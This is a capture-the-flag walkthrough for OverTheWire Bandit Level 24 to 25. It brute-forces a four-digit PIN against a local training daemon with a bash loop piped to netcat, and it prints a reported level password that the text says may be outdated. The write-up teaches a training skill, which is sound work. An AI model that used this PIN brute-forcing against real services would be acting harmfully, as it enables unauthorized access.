// Bandit Level 24 → Level 25

URL: https://overthewire.org/wargames/bandit/

Step1: Log in to the Bandit Level 24 server:

        ssh bandit24@bandit.labs.overthewire.org -p 2220

Step2: Enter the password obtained from Bandit Level 23.

Step3: The challenge tells us that a daemon is listening on port `30002`.

Step4: The daemon requires two things:

        Bandit Level 24 password
        +
        4-digit PIN

Step5: We do not know the PIN. There are 10,000 possible combinations:

        0000 → 9999

Step6: We can use `nc` to connect to the service:

        nc localhost 30002

Step7: The format expected by the server is:

        <bandit24_password> <4-digit-pin>

Step8: Instead of trying all 10,000 combinations manually, we can generate them using a loop.

Step9: Run:

        for i in $(seq -w 0000 9999); do
            echo "YOUR_BANDIT24_PASSWORD $i"
        done | nc localhost 30002

Step10: Replace `YOUR_BANDIT24_PASSWORD` with the actual Bandit Level 24 password.

Step11: A cleaner one-line version is:

        for i in $(seq -w 0000 9999); do echo "YOUR_BANDIT24_PASSWORD $i"; done | nc localhost 30002

Step12: The command generates:

        password 0000
        password 0001
        password 0002
        ...
        password 9999

Step13: These are sent to port `30002` through one Netcat connection.

Step14: Most responses will say:

        Wrong!

Step15: When the correct PIN is reached, the server returns:

        Correct!

        followed by the password for Bandit Level 25.

Step16: One recent writeup reports the Bandit Level 25 password as:

        iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

Step17: Another recent writeup reports a different current password, which shows that Bandit passwords can change.

Step18: Therefore, use the password printed by your own live Bandit server rather than relying on an old online password.

Step19: The Bandit Level 24 → Level 25 challenge is solved.

Step20: Congratulations!! you have solved this problem!!
